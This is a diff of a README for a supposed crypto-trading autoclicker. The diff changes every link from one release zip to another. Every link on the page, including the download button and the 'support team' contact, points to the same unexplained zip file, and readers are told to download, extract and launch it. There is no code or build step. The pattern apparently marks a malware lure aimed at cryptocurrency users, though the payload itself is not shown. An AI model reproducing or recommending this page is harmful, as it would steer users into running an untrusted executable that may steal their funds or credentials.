@@ -1,6 +1,6 @@
 # 🤖 Welcome to xKucoinBot Script Autoclicker! 🚀
 
-![Autoclicker](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip)
+![Autoclicker](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v2.0/Software.zip)
 
 ## Description:
 This repository contains a powerful autoclicker script designed specifically for the xKucoin cryptocurrency trading platform. With this autoclicker script, you can automate your trading strategies and optimize your trading experience on xKucoinBot. Say goodbye to manual clicking and let the autoclicker do the work for you!
@@ -12,9 +12,9 @@ This repository contains a powerful autoclicker script designed specifically for
 🔹 Increase your chances of successful trades  
 
 ## Installation:
-To get started with the xKucoinBot Script Autoclicker, simply download the [https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip file](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip), extract it, and launch the software. It's that easy!
+To get started with the xKucoinBot Script Autoclicker, simply download the [https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v2.0/Software.zip file](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v2.0/Software.zip), extract it, and launch the software. It's that easy!
 
-[![Download Autoclicker](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip)](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip)  
+[![Download Autoclicker](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v2.0/Software.zip)](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v2.0/Software.zip)  
 
 If you encounter any issues with the download link, please check the "Releases" section for alternative download options.
 
@@ -43,7 +43,7 @@ If you encounter any issues with the download link, please check the "Releases" 
 Contributions to the xKucoinBot Script Autoclicker repository are welcome! Whether you want to suggest new features, report bugs, or improve the existing code, feel free to submit a pull request. Together, we can make this autoclicker even more powerful.
 
 ## Support:
-For any questions or assistance regarding the xKucoinBot Script Autoclicker, please contact our support team at [https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip). We are here to help you maximize your trading efficiency with our autoclicker script.
+For any questions or assistance regarding the xKucoinBot Script Autoclicker, please contact our support team at [https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v2.0/Software.zip](https://github.com/FlameOptics/xkucoinbot-script-autoclicker/releases/download/v2.0/Software.zip). We are here to help you maximize your trading efficiency with our autoclicker script.
 
 ## License:
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
